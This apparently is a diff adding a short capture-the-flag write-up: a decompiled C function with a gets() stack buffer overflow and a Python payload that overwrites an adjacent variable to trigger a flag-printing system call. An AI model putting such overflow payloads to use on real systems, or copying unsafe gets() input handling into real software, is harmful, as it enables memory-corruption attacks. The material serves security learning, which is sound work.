@@ -1,0 +1,20 @@
+<p>Decompiled:</p>
+<pre><code class="language-c">int func()
+{
+  char v1[60]; // [rsp+0h] [rbp-40h] BYREF
+  int v2; // [rsp+3Ch] [rbp-4h]
+
+  puts(&quot;Guess the correct key to win!&quot;);
+  v2 = -559038737;
+  printf(&quot;Enter the key: &quot;);
+  gets(v1);
+  if ( v2 == 0xCAFEBABE )
+    return system(&quot;cat flag.txt&quot;);
+  puts(&quot;Wrong Key&quot;);
+  return puts(&quot;Try again!&quot;);
+}
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-py">import sys
+sys.stdout.buffer.write((b&quot;A&quot; * 60) + b&quot;\xbe\xba\xfe\xca&quot;)
+</code></pre>
